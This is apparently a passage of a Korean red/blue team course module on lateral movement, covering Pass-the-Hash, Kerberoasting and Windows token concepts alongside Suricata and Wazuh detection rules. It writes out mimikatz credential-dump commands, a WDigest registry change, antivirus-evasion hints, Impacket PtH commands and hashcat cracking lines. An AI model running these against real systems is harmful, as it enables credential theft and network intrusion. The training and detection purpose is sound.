# Week 04: 측면 이동 심화 — Pass-the-Hash, Kerberoasting, Token Impersonation, WMI/PSExec

## 학습 목표
- Pass-the-Hash(PtH) 공격의 원리를 이해하고 mimikatz를 활용하여 해시 덤프 및 인증 우회를 실습할 수 있다
- Kerberoasting 공격의 원리(TGS 티켓 요청 → 오프라인 크래킹)를 이해하고 GetUserSPNs.py로 공격을 재현할 수 있다
- Token Impersonation(토큰 가장)으로 다른 사용자의 컨텍스트에서 명령을 실행하는 기법을 이해한다
- WMI/PSExec을 활용한 원격 명령 실행의 동작 원리와 네트워크 흔적을 분석할 수 있다
- 각 측면 이동 기법에 대한 탐지 전략(이벤트 로그, Suricata 룰, Wazuh 디코더)을 수립할 수 있다
- OpsClaw execute-plan을 통해 측면 이동 시뮬레이션과 탐지를 자동화할 수 있다

## 전제 조건
- 공방전 기초 과정(course11) 이수 완료
- Week 01-03 학습 완료 (APT 킬체인, 침투, 권한 상승 이해)
- Windows/Linux 인증 메커니즘 기초 (NTLM, Kerberos 개념)
- Impacket 도구 사용 경험 권장
- OpsClaw 플랫폼 기본 사용법 (프로젝트 생성, execute-plan)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh, OpenCTI) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: Pass-the-Hash 공격과 NTLM 인증 | 강의/실습 |
| 0:40-1:20 | Part 2: Kerberoasting과 Kerberos 프로토콜 심화 | 강의/실습 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: Token Impersonation과 권한 위임 | 강의/실습 |
| 2:10-2:50 | Part 4: WMI/PSExec 원격 실행과 탐지 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 종합 시나리오: 측면 이동 체인 공격·탐지 | 실습/토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **PtH** | Pass-the-Hash | 평문 비밀번호 없이 NTLM 해시만으로 인증 | 열쇠 없이 열쇠 본뜬 것으로 문 열기 |
| **NTLM** | NT LAN Manager | Windows 레거시 인증 프로토콜 (챌린지-응답) | 악수(도전-응답) 방식 신분증명 |
| **Kerberos** | Kerberos | 티켓 기반 네트워크 인증 프로토콜 | 공연 입장권 시스템 |
| **TGT** | Ticket Granting Ticket | 인증 서버에서 발급받는 마스터 티켓 | 놀이공원 입장권 |
| **TGS** | Ticket Granting Service | 특정 서비스 접근용 서비스 티켓 | 개별 놀이기구 탑승권 |
| **SPN** | Service Principal Name | Kerberos 서비스 식별자 | 서비스 이름표 |
| **Kerberoasting** | Kerberoasting | SPN 등록 계정의 TGS를 오프라인 크래킹 | 탑승권에 적힌 비밀번호 해독 |
| **Token** | Access Token | 프로세스의 보안 컨텍스트(권한) 정보 | 사원증 |
| **Impersonation** | 가장/사칭 | 다른 사용자의 토큰으로 작업 수행 | 사원증 빌려 쓰기 |
| **WMI** | Windows Management Instrumentation | Windows 원격 관리 인터페이스 | 건물 관리 시스템 리모컨 |
| **PSExec** | PsExec | Sysinternals의 원격 실행 도구 | 원격 데스크톱의 CLI 버전 |
| **LSASS** | Local Security Authority Subsystem | 인증 정보를 관리하는 Windows 프로세스 | 보안 금고 |
| **SAM** | Security Account Manager | 로컬 계정 해시를 저장하는 데이터베이스 | 비밀번호 장부 |
| **DCSync** | DCSync | 도메인 컨트롤러를 흉내 내어 해시 수집 | 인사팀인 척 직원 정보 요청 |
| **Lateral Movement** | 측면 이동 | 내부 네트워크에서 다른 시스템으로 이동 | 건물 내 방 옮기기 |

---

# Part 1: Pass-the-Hash 공격과 NTLM 인증 (40분)

## 1.1 NTLM 인증 프로토콜의 구조

Windows의 NTLM(NT LAN Manager) 인증은 챌린지-응답(Challenge-Response) 방식으로 동작한다. 이 인증 프로토콜의 구조적 취약점이 Pass-the-Hash 공격을 가능하게 한다.

### NTLM 인증 흐름

```
+----------+                    +----------+                    +----------+
|  클라이언트 |                    |   서버    |                    |    DC     |
+-----+----+                    +-----+----+                    +-----+----+
      |  1. NEGOTIATE_MESSAGE          |                              |
      | -----------------------------> |                              |
      |                                |                              |
      |  2. CHALLENGE_MESSAGE          |                              |
      | <----------------------------- |                              |
      |  (서버가 랜덤 챌린지 전송)       |                              |
      |                                |                              |
      |  3. AUTHENTICATE_MESSAGE       |                              |
      | -----------------------------> |                              |
      |  (해시로 챌린지 암호화하여 응답)  |                              |
      |                                |  4. 검증 요청                  |
      |                                | ----------------------------> |
      |                                |  5. 검증 결과                  |
      |                                | <---------------------------- |
      |  6. 인증 결과                    |                              |
      | <----------------------------- |                              |
```

### NTLM 해시의 구조

```
NTLM 해시 = MD4(UTF-16LE(password))

예시:
  비밀번호: "Password123"
  NTLM 해시: a4f49c406510bdcab6824ee7c30fd852

LM 해시 (레거시, 취약):
  비밀번호를 14자로 패딩 → 7자씩 분할 → DES 키로 사용
  Windows Vista 이후 기본 비활성화
```

**핵심 취약점**: NTLM 인증에서 서버는 **평문 비밀번호가 아닌 해시**를 사용하여 챌린지에 응답한다. 따라서 해시만 탈취하면 비밀번호 없이도 인증이 가능하다.

### NTLMv1 vs NTLMv2 비교

| 특성 | NTLMv1 | NTLMv2 |
|------|--------|--------|
| 챌린지 크기 | 8바이트 | 8바이트 + 클라이언트 챌린지 |
| 응답 알고리즘 | DES 기반 | HMAC-MD5 기반 |
| 보안 수준 | 취약 (레인보우 테이블 가능) | 상대적으로 강화 |
| 리플레이 방어 | 없음 | 타임스탬프 포함 |
| PtH 취약 여부 | 취약 | **여전히 취약** (해시 자체로 인증) |

> **중요**: NTLMv2도 Pass-the-Hash에 취약하다. 해시를 알면 챌린지에 대한 올바른 응답을 생성할 수 있기 때문이다.

## 1.2 Pass-the-Hash 공격 원리

Pass-the-Hash(PtH)는 NTLM 해시를 탈취한 후, 해당 해시를 그대로 사용하여 다른 시스템에 인증하는 기법이다.

### 공격 흐름

```
+-------------------------------------------------------------+
|                Pass-the-Hash 공격 흐름                        |
+-------------------------------------------------------------+
| 1. 초기 침투 → 로컬 관리자 권한 획득                           |
| 2. LSASS 메모리에서 NTLM 해시 덤프 (mimikatz)                |
| 3. 탈취한 해시로 다른 시스템에 NTLM 인증                       |
| 4. 새 시스템에서 추가 해시 수집 → 반복                         |
|                                                             |
| [공격자] → [시스템A: 해시 덤프] → [시스템B: PtH 인증]          |
|                                    → [시스템C: PtH 인증]      |
|                                    → [DC: PtH → 도메인 장악]  |
+-------------------------------------------------------------+
```

### ATT&CK 매핑

| 단계 | ATT&CK ID | 기법명 | 설명 |
|------|-----------|--------|------|
| 해시 덤프 | T1003.001 | OS Credential Dumping: LSASS Memory | LSASS에서 인증 정보 추출 |
| 해시 덤프 | T1003.002 | OS Credential Dumping: SAM | SAM 데이터베이스에서 해시 추출 |
| 인증 우회 | T1550.002 | Use Alternate Authentication: Pass the Hash | NTLM 해시로 인증 |
| 측면 이동 | T1021.002 | Remote Services: SMB/Windows Admin Shares | SMB를 통한 원격 접근 |

## 1.3 mimikatz를 활용한 해시 덤프 실습

### 실습 1: LSASS 메모리에서 해시 추출 시뮬레이션

**실습 목적**: NTLM 해시가 메모리에 어떻게 저장되는지 이해하고, 해시 덤프의 원리를 Linux 환경에서 시뮬레이션하여 공격자의 관점을 체험한다.

**배우는 것**: NTLM 해시 구조, 크리덴셜 덤프 탐지 방법, 메모리 기반 공격의 위험성

```bash
# -- opsclaw 서버에서 실행 (공격자 관점) --

# 1. 실습용 해시 파일 생성 (mimikatz 출력 형식 시뮬레이션)
cat << 'HASHEOF' > /tmp/lab_hashes.txt
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
SID               : S-1-5-18
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : LABCORP
         * NTLM     : a4f49c406510bdcab6824ee7c30fd852
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

Authentication Id : 0 ; 53897 (00000000:0000d289)
Session           : Interactive from 1
User Name         : svc_backup
Domain            : LABCORP
Logon Server      : DC01
SID               : S-1-5-21-123456-789012-345678-1103
        msv :
         [00000003] Primary
         * Username : svc_backup
         * Domain   : LABCORP
         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
         * SHA1     : a94d89c47e9b1b2e0f5bc16403d0fa38a5c7d6e1

Authentication Id : 0 ; 78234 (00000000:000131aa)
Session           : Interactive from 1
User Name         : jsmith
Domain            : LABCORP
Logon Server      : DC01
SID               : S-1-5-21-123456-789012-345678-1104
        msv :
         [00000003] Primary
         * Username : jsmith
         * Domain   : LABCORP
         * NTLM     : 7c3ea36b29ba12b8b34012cc1c0898e3
         * SHA1     : b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3
HASHEOF

echo "[+] 실습용 해시 파일 생성 완료"

# 2. 해시 추출 (grep으로 NTLM 해시만 파싱)
echo "[+] NTLM 해시 추출 중..."
grep -A1 "Username" /tmp/lab_hashes.txt | grep "NTLM" | awk '{print $NF}'

# 3. 사용자:해시 쌍으로 정리
echo ""
echo "[+] 크리덴셜 목록:"
grep -B2 "NTLM" /tmp/lab_hashes.txt | grep -E "(Username|NTLM)" | \
  paste - - | awk '{print $4 ":" $NF}'

# 4. 해시 형식 분석
echo ""
echo "[+] 해시 분석:"
while IFS=: read -r user hash; do
    echo "  사용자: $user"
    echo "  해시: $hash"
    echo "  길이: ${#hash}자 (NTLM = 32자 hex)"
    echo "  ---"
done << 'EOF'
Administrator:a4f49c406510bdcab6824ee7c30fd852
svc_backup:32ed87bdb5fdc5e9cba88547376818d4
jsmith:7c3ea36b29ba12b8b34012cc1c0898e3
EOF
```

**명령어 해설**:
- `grep -A1 "Username"`: "Username" 문자열이 있는 줄과 그 다음 1줄을 함께 출력한다
- `awk '{print $NF}'`: 각 줄의 마지막 필드(해시값)만 출력한다
- `paste - -`: 두 줄을 하나의 줄로 합친다 (사용자명 줄 + 해시 줄)
- NTLM 해시는 항상 32자 16진수(128비트 MD4) 형태이다

**결과 해석**: mimikatz의 `sekurlsa::logonpasswords` 출력에서 NTLM 해시를 추출하면, 이 해시만으로 PtH 공격이 가능하다. 서비스 계정(svc_backup)의 해시는 특히 위험한데, 서비스 계정은 보통 여러 서버에 동일한 비밀번호를 사용하기 때문이다.

**실전 활용**: 실제 환경에서 mimikatz 실행은 `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` 형태이다. EDR 탐지를 피하기 위해 공격자들은 메모리 덤프를 먼저 수행(procdump, comsvcs.dll MiniDump)한 후 오프라인에서 분석한다.

**트러블슈팅**:
- `ACCESS DENIED` 오류: SeDebugPrivilege 권한 필요 → 관리자 권한으로 실행
- 해시가 표시되지 않음: WDigest 인증이 비활성화된 환경 → `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1` (테스트용)
- 백신 탐지: mimikatz 시그니처 탐지 → 난독화 빌드 또는 대안 도구(pypykatz) 사용

### 실습 2: Impacket을 활용한 Pass-the-Hash 인증 시뮬레이션

**실습 목적**: 탈취한 NTLM 해시를 사용하여 원격 시스템에 인증하는 과정을 Impacket 도구로 시뮬레이션하고, PtH 공격의 네트워크 흔적을 분석한다.

**배우는 것**: PtH 공격의 실제 실행 방법, SMB 인증 과정, 네트워크 트래픽에서의 PtH 탐지 포인트

```bash
# -- opsclaw 서버에서 실행 --

# 1. Impacket 설치 확인
pip3 list 2>/dev/null | grep -i impacket || echo "[!] Impacket 미설치"

# 2. PtH 공격 시뮬레이션 (실제 대상 없이 명령 구조 확인)
echo "[+] Pass-the-Hash 공격 명령 예시:"
echo ""
echo "# smbclient를 통한 PtH"
echo "smbclient.py LABCORP/Administrator@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"
echo ""
echo "# psexec을 통한 PtH (원격 셸 획득)"
echo "psexec.py LABCORP/Administrator@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"
echo ""
echo "# wmiexec을 통한 PtH (WMI 사용, 서비스 미생성)"
echo "wmiexec.py LABCORP/Administrator@10.20.30.80 -hashes :a4f49c406510bdcab6824ee7c30fd852"

# 3. Linux 환경에서의 해시 기반 인증 테스트 (SSH 키 방식과 비교)
echo ""
echo "[+] Linux 환경의 유사 개념: SSH 키 인증"
echo "  - Windows PtH: 해시만으로 인증 (비밀번호 불필요)"
echo "  - Linux SSH 키: 개인키만으로 인증 (비밀번호 불필요)"
echo "  - 공통점: 인증 정보 자체가 접근 수단"

# 4. PtH 네트워크 트래픽 특성 분석
echo ""
echo "[+] PtH 탐지를 위한 네트워크 특성:"
echo "  - SMB 세션에서 NTLM 인증 사용 (Kerberos가 아닌 NTLM)"
echo "  - 로그온 유형 3 (Network Logon) - 이벤트 ID 4624"
echo "  - 동일 해시로 짧은 시간 내 다수 시스템 접근"
echo "  - 소스 IP가 서버가 아닌 워크스테이션"

# 5. OpsClaw를 통한 PtH 탐지 시뮬레이션
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "name": "week04-pth-detection",
    "request_text": "Pass-the-Hash 공격 탐지 시뮬레이션",
    "master_mode": "external"
  }' | python3 -m json.tool 2>/dev/null || echo "[참고] OpsClaw API 미기동 시 스킵"
```

**명령어 해설**:
- `smbclient.py`: Impacket의 SMB 클라이언트. `-hashes :해시` 옵션으로 NTLM 해시 직접 전달
- `psexec.py`: 원격 서비스를 생성하여 명령 실행. 흔적이 많이 남는다
- `wmiexec.py`: WMI를 통한 원격 실행. 서비스를 생성하지 않아 흔적이 적다
- `-hashes` 형식: `LM해시:NTLM해시`. LM 해시가 없으면 `:NTLM해시`로 지정

**결과 해석**: PtH 공격이 성공하면 원격 시스템에서 해당 계정의 권한으로 명령 실행이 가능하다. 이벤트 로그에서 로그온 유형 3(네트워크 로그온) + NTLM 인증 + 비정상 소스 IP 조합으로 탐지할 수 있다.

**실전 활용**: 실제 침투 테스트에서는 도메인 관리자 해시를 확보하면 모든 도메인 시스템에 접근 가능하다. 방어 측면에서는 LAPS(Local Administrator Password Solution)를 도입하여 각 시스템의 로컬 관리자 비밀번호를 고유하게 만들어야 한다.

**트러블슈팅**:
- `STATUS_LOGON_FAILURE`: 해시가 잘못되었거나 해당 계정이 대상 시스템에 없음
- `STATUS_ACCESS_DENIED`: 계정에 원격 접근 권한이 없음 (Remote Desktop Users 또는 Administrators 그룹 필요)
- `SMB SessionError`: 대상 시스템에서 SMBv1이 비활성화된 경우 → Impacket 최신 버전으로 업데이트

## 1.4 Pass-the-Hash 탐지 및 방어

### 탐지 전략

| 탐지 방법 | 데이터 소스 | 탐지 로직 |
|----------|-----------|----------|
| 이벤트 로그 분석 | Windows Security Log (4624, 4625) | 로그온 유형 3 + NTLM 인증 + 비정상 IP |
| 네트워크 모니터링 | SMB 트래픽 | 단시간 내 다수 호스트에 NTLM 인증 시도 |
| LSASS 보호 | Sysmon (Event ID 10) | lsass.exe에 대한 OpenProcess 호출 |
| 행위 분석 | EDR 텔레메트리 | 비정상 프로세스가 LSASS 접근 |

### 방어 대책

| 대책 | 설명 | 효과 |
|------|------|------|
| **Credential Guard** | 하이퍼바이저로 LSASS 격리 | 해시 덤프 차단 |
| **LAPS** | 로컬 관리자 비밀번호 자동 순환 | PtH 확산 차단 |
| **특권 계정 티어링** | 도메인/서버/워크스테이션 계정 분리 | 측면 이동 범위 제한 |
| **SMB 서명** | SMB 패킷 무결성 검증 | 릴레이 공격 차단 |
| **Protected Users** | 특수 보안 그룹 | NTLM 인증 비활성화 |

---

# Part 2: Kerberoasting과 Kerberos 프로토콜 심화 (40분)

## 2.1 Kerberos 인증 프로토콜 동작 원리

Kerberos는 Active Directory 환경의 기본 인증 프로토콜로, 티켓 기반의 안전한 인증을 제공한다. 그러나 설계상 특정 공격(Kerberoasting)에 취약한 구조를 가진다.

### Kerberos 인증 흐름 (3단계)

```
+----------+     1. AS-REQ (사용자 인증)      +----------+
|          | ------------------------------> |          |
| 클라이언트 |     2. AS-REP (TGT 발급)         |   KDC     |
|          | <------------------------------ | (DC)     |
|          |                                 |          |
|          |     3. TGS-REQ (서비스 티켓 요청)  |          |
|          | ------------------------------> |          |
|          |     4. TGS-REP (서비스 티켓 발급)  |          |
|          | <------------------------------ |          |
+-----+----+                                 +----------+
      |
      |     5. AP-REQ (서비스 티켓 제시)
      | ------------------------------> +----------+
      |     6. AP-REP (서비스 응답)       |  서비스   |
      | <------------------------------ |  서버     |
      |                                 +----------+
```

### 핵심 암호화 구조

```
+---------------------------------------------------------+
| TGT (Ticket Granting Ticket)                            |
+---------------------------------------------------------+
| 암호화 키: krbtgt 계정의 비밀번호 해시                      |
| 내용: 사용자 SID, 그룹 멤버십, 유효 기간                    |
| 특성: 클라이언트가 복호화할 수 없음                         |
+---------------------------------------------------------+
| TGS (Service Ticket)                                    |
+---------------------------------------------------------+
| 암호화 키: ★ 대상 서비스 계정의 비밀번호 해시 ★              |
| 내용: 사용자 SID, 그룹 멤버십, 세션 키                     |
| 특성: 서비스 계정의 비밀번호로 암호화됨                      |
| --> Kerberoasting의 공격 포인트!                         |
+---------------------------------------------------------+
```

## 2.2 Kerberoasting 공격 원리

Kerberoasting은 SPN(Service Principal Name)이 등록된 서비스 계정의 TGS 티켓을 요청한 후, 이 티켓을 오프라인에서 크래킹하여 서비스 계정의 비밀번호를 알아내는 공격이다.

### 공격이 가능한 이유

1. **도메인 사용자 누구나** TGS 티켓을 요청할 수 있다 (특별한 권한 불필요)
2. TGS 티켓은 **서비스 계정의 비밀번호 해시**로 암호화된다
3. 요청한 TGS를 **오프라인**에서 무제한으로 크래킹 시도 가능
4. **계정 잠금 정책이 적용되지 않는다** (온라인 인증이 아니므로)

### 공격 흐름

```
1. 도메인에 인증된 사용자 → SPN 등록 계정 열거 (LDAP 조회)
2. 원하는 SPN의 TGS 티켓 요청 (정상적인 Kerberos 동작)
3. 티켓(RC4/AES 암호화)을 로컬에 저장
4. hashcat/john으로 오프라인 크래킹
5. 크래킹 성공 → 서비스 계정 비밀번호 획득 → 측면 이동
```

### ATT&CK 매핑

| 단계 | ATT&CK ID | 기법명 |
|------|-----------|--------|
| SPN 열거 | T1069.002 | Permission Groups Discovery: Domain Groups |
| 티켓 요청 | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting |
| 크래킹 | T1110.002 | Brute Force: Password Cracking |

## 2.3 GetUserSPNs.py를 활용한 Kerberoasting 실습

### 실습 3: SPN 열거 및 TGS 티켓 추출 시뮬레이션

**실습 목적**: Kerberoasting 공격의 전체 과정(SPN 열거 → 티켓 요청 → 오프라인 크래킹)을 시뮬레이션하여 공격 원리를 이해하고, 탐지 포인트를 파악한다.

**배우는 것**: SPN 개념, TGS 티켓 구조, Kerberoasting 탐지 방법(이벤트 ID 4769), 서비스 계정 보안 강화 방법

```bash
# -- opsclaw 서버에서 실행 --

# 1. Impacket GetUserSPNs.py 명령 구조 확인
echo "[+] GetUserSPNs.py 사용법:"
echo ""
echo "# SPN 등록 계정 열거"
echo "GetUserSPNs.py LABCORP.LOCAL/jsmith:Password123 -dc-ip 10.20.30.50"
echo ""
echo "# TGS 티켓 요청 (hashcat 형식으로 저장)"
echo "GetUserSPNs.py LABCORP.LOCAL/jsmith:Password123 -dc-ip 10.20.30.50 -request -outputfile tgs_tickets.txt"

# 2. Kerberoasting 티켓 형식 시뮬레이션
cat << 'TGSEOF' > /tmp/lab_tgs_tickets.txt
$krb5tgs$23$*svc_mssql$LABCORP.LOCAL$MSSQLSvc/sql01.labcorp.local:1433*$a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2$e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8
$krb5tgs$23$*svc_backup$LABCORP.LOCAL$CIFS/backup01.labcorp.local*$b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3$f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
$krb5tgs$23$*svc_web$LABCORP.LOCAL$HTTP/web01.labcorp.local*$c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4$a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0
TGSEOF

echo "[+] 시뮬레이션 TGS 티켓 생성 완료"
echo ""

# 3. 티켓 분석
echo "[+] TGS 티켓 구조 분석:"
while IFS= read -r line; do
    SPN=$(echo "$line" | grep -oP '\*\K[^*]+')
    ETYPE=$(echo "$line" | grep -oP '\$krb5tgs\$\K[0-9]+')
    echo "  SPN: $SPN"
    echo "  암호화 유형: $ETYPE (23=RC4, 17=AES128, 18=AES256)"
    echo "  크래킹 난이도: $([ "$ETYPE" = "23" ] && echo "낮음 (RC4)" || echo "높음 (AES)")"
    echo "  ---"
done < /tmp/lab_tgs_tickets.txt

# 4. hashcat 크래킹 명령 구조
echo ""
echo "[+] hashcat 크래킹 명령:"
echo "  # RC4 (Type 23) - GPU 크래킹"
echo "  hashcat -m 13100 tgs_tickets.txt /usr/share/wordlists/rockyou.txt"
echo ""
echo "  # AES256 (Type 18) - 더 느리지만 가능"
echo "  hashcat -m 19700 tgs_tickets.txt /usr/share/wordlists/rockyou.txt"
echo ""
echo "  # john the ripper 대안"
echo "  john --format=krb5tgs tgs_tickets.txt --wordlist=rockyou.txt"

# 5. 크래킹 속도 비교
echo ""
echo "[+] GPU별 예상 크래킹 속도 (RC4, hashcat):"
echo "  RTX 4090: ~6.5 GH/s (초당 65억 시도)"
echo "  RTX 3090: ~3.2 GH/s"
echo "  8자 복잡한 비밀번호: ~2.5시간 (RTX 4090 기준)"
echo "  12자 복잡한 비밀번호: ~수백만 년"
echo "  → 서비스 계정 비밀번호는 25자 이상 랜덤 권장"
```

**명령어 해설**:
- `GetUserSPNs.py`: Impacket의 Kerberoasting 도구. LDAP으로 SPN 열거 후 TGS 요청
- `$krb5tgs$23$`: hashcat이 인식하는 Kerberoasting 해시 형식. 23은 RC4 암호화 유형
- `-m 13100`: hashcat의 Kerberoasting(RC4) 모드
- `-m 19700`: hashcat의 Kerberoasting(AES256) 모드

**결과 해석**: RC4(Type 23) 암호화 티켓은 GPU 크래킹에 매우 취약하다. AES256(Type 18) 암호화를 사용하면 크래킹 속도가 크게 감소한다. 서비스 계정의 비밀번호가 짧거나 사전에 있는 단어면 수분 내에 크래킹된다.

**실전 활용**: 침투 테스트 시 Kerberoasting은 "소음이 적은" 공격으로 선호된다. TGS 요청 자체는 정상적인 Kerberos 동작이므로 탐지가 어렵다. 단, Windows 이벤트 ID 4769에서 RC4 암호화 유형(0x17)으로 대량 TGS 요청을 탐지할 수 있다.

**트러블슈팅**:
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: 도메인 이름이 잘못됨 → FQDN(LABCORP.LOCAL) 확인
- `KRB_AP_ERR_SKEW`: 시간 동기화 오류 → `ntpdate` 또는 `rdate`로 DC와 시간 동기화
- 크래킹 실패(Exhausted): 사전 파일이 부족 → 규칙 기반 공격(-r rules/best64.rule) 추가

## 2.4 Kerberoasting 탐지 및 방어

### 실습 4: Suricata에서 Kerberoasting 탐지 룰 작성

**실습 목적**: Suricata IDS에서 Kerberoasting 공격의 네트워크 흔적을 탐지하는 커스텀 룰을 작성하고, 정상 Kerberos 트래픽과 공격 트래픽을 구분하는 기준을 학습한다.

**배우는 것**: Suricata 룰 문법, Kerberos 프로토콜 필드 분석, 임계값 기반 탐지

```bash
# -- secu 서버에서 실행 --

# 1. Kerberoasting 탐지 Suricata 룰
cat << 'RULEEOF'
# Kerberoasting 탐지: 단시간 내 다수 TGS-REQ (RC4 암호화)
# TGS-REQ에서 RC4 (etype 23) 요청이 threshold 초과 시 알림
alert krb5 any any -> any any (msg:"OPSCLAW Kerberoasting - Multiple RC4 TGS Requests"; \
    krb5.msgtype:13; \
    krb5_ticket_encryption:17; \
    threshold:type both, track by_src, count 10, seconds 60; \
    classtype:credential-theft; \
    sid:2026041; rev:1;)

# 비정상적인 SPN 패턴 탐지 (일반 사용자가 서비스 티켓 대량 요청)
alert krb5 any any -> any any (msg:"OPSCLAW Suspicious TGS-REQ Burst from Single Source"; \
    krb5.msgtype:13; \
    threshold:type threshold, track by_src, count 20, seconds 120; \
    classtype:credential-theft; \
    sid:2026042; rev:1;)
RULEEOF

echo "[+] Kerberoasting 탐지 룰 출력 완료"
echo ""

# 2. Windows 이벤트 로그 기반 탐지 (Wazuh 연동)
echo "[+] Windows 이벤트 기반 탐지:"
echo "  Event ID 4769 - Kerberos Service Ticket Requested"
echo "  탐지 조건:"
echo "    - Ticket Encryption Type: 0x17 (RC4)"
echo "    - 동일 소스에서 60초 내 10건 이상"
echo "    - 서비스 이름이 다양함 (여러 SPN 열거)"
echo ""

# 3. Wazuh 커스텀 룰 작성
cat << 'WAZUHEOF'
<!-- Kerberoasting 탐지 Wazuh 룰 -->
<group name="kerberoasting,">
  <rule id="100201" level="12">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.ticketEncryptionType">0x17</field>
    <description>Kerberoasting: RC4 encrypted TGS ticket requested</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
    <group>credential_theft,</group>
  </rule>

  <rule id="100202" level="14" frequency="10" timeframe="60">
    <if_matched_sid>100201</if_matched_sid>
    <same_source_ip/>
    <description>Kerberoasting: Multiple RC4 TGS requests from same source</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
    <group>credential_theft,</group>
  </rule>
</group>
WAZUHEOF

echo ""
echo "[+] Wazuh 룰 출력 완료"
```

**명령어 해설**:
- `krb5.msgtype:13`: Kerberos 메시지 유형 13은 TGS-REQ(서비스 티켓 요청)를 의미한다
- `threshold:type both, track by_src, count 10, seconds 60`: 동일 소스에서 60초 내 10건 이상 발생 시 알림
- `if_matched_sid`: 이전 룰이 매칭된 경우에만 동작하는 상관 룰
- `same_source_ip`: 동일 소스 IP에서 반복 발생하는 경우만 탐지

**결과 해석**: RC4 암호화 유형의 TGS 요청이 단시간에 대량 발생하면 Kerberoasting 공격일 가능성이 높다. 그러나 정상적인 서비스 인증에서도 RC4 TGS가 발생할 수 있으므로, 빈도와 패턴을 함께 분석해야 오탐을 줄일 수 있다.

**실전 활용**: AES 전용 정책을 적용하면 RC4 TGS 요청 자체가 비정상이 되므로 탐지 정확도가 대폭 향상된다. `msDS-SupportedEncryptionTypes` 속성을 AES128+AES256만 허용하도록 설정한다.

**트러블슈팅**:
- Suricata에서 krb5 키워드 미인식: Suricata 6.0+ 필요. `suricata --build-info | grep -i kerberos`로 확인
- 오탐 과다: threshold 값을 조정하거나, 정상 서비스 계정을 화이트리스트에 추가
- 로그 누락: Suricata EVE JSON 로그에 krb5 이벤트 활성화 필요

### 방어 대책 정리

| 대책 | 설명 | 효과 |
|------|------|------|
| **AES 전용 정책** | RC4 암호화 비활성화 | 크래킹 난이도 대폭 증가 |
| **긴 비밀번호** | 서비스 계정 25자+ 랜덤 | 크래킹 불가능 수준 |
| **gMSA** | Group Managed Service Accounts | 자동 비밀번호 순환 (120자) |
| **모니터링** | 이벤트 ID 4769 감시 | RC4 TGS 요청 탐지 |
| **티어링** | 서비스 계정 권한 최소화 | 크래킹 성공 시 피해 제한 |

---

# Part 3: Token Impersonation과 권한 위임 (40분)

## 3.1 Windows 액세스 토큰 구조

Windows에서 모든 프로세스는 액세스 토큰(Access Token)을 가지며, 이 토큰에 사용자 SID, 그룹 멤버십, 권한 정보가 포함된다.

### 토큰 유형

| 토큰 유형 | 설명 | 생성 시점 | 위험도 |
|----------|------|----------|--------|
| **Primary Token** | 프로세스의 주 토큰 | 프로세스 생성 시 | 높음 |
| **Impersonation Token** | 위임된 보안 컨텍스트 | 서비스가 클라이언트를 대행할 때 | 높음 |
| **Delegation Token** | 이중 홉 인증용 | 서비스가 다른 서비스에 인증할 때 | 매우 높음 |

### Impersonation Level

```
+---------------------------------------------------------+
| Impersonation Level (낮음 → 높음)                        |
+------------------+--------------------------------------+
| Anonymous        | 클라이언트 정보 접근 불가               |
| Identification   | 클라이언트 정보 조회만 가능             |
| Impersonation    | 로컬 리소스에서 클라이언트로 행동 가능    |
| Delegation       | 원격 리소스에서도 클라이언트로 행동 가능   |
+------------------+--------------------------------------+

공격자가 노리는 것: Impersonation 또는 Delegation 레벨 토큰
```

## 3.2 Token Impersonation 공격

Token Impersonation은 다른 사용자(특히 관리자)의 토큰을 탈취하여 해당 사용자의 권한으로 명령을 실행하는 기법이다.

